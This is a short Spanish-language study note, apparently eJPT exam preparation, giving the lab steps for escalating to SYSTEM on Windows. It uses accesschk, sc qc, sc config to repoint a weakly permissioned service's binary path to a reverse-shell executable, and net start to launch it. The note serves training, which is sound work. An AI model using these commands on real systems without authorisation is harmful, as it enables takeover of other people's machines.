
- Use accesschk.exe para verificar los permisos de la cuenta de "usuario" en el servicio "daclsvc:

```
C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
```
Tenga en cuenta que la cuenta de "usuario" tiene el permiso para cambiar la configuración del servicio ( SERVICE_CHANGE_CONFIG ).

- Consulte el servicio y tenga en cuenta que se ejecuta con privilegios de SISTEMA ( SERVICE_START_NAME ):

```
sc qc daclsvc
```

- Modifique la configuración del servicio y configure BINARY_PATH_NAME ( binpath ) en el ejecutable reverse.exe que creó:

```
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
```

- Inicie un oyente en Kali y luego comience el servicio para generar una carcasa inversa que funcione con privilegios de SISTEMA:

```
net start daclsvc
```

enlace:
[[Local/Ciberseguridad/HACKING/CERTIFICACIONES/EJPT/Preparacion-Ejpt]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Windows/Herramientas]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Windows/Service Exploits - Insecure Service Executables]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Windows/Service Exploits - Unquoted Service Path]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Windows/Generate a Reverse Shell Executable]]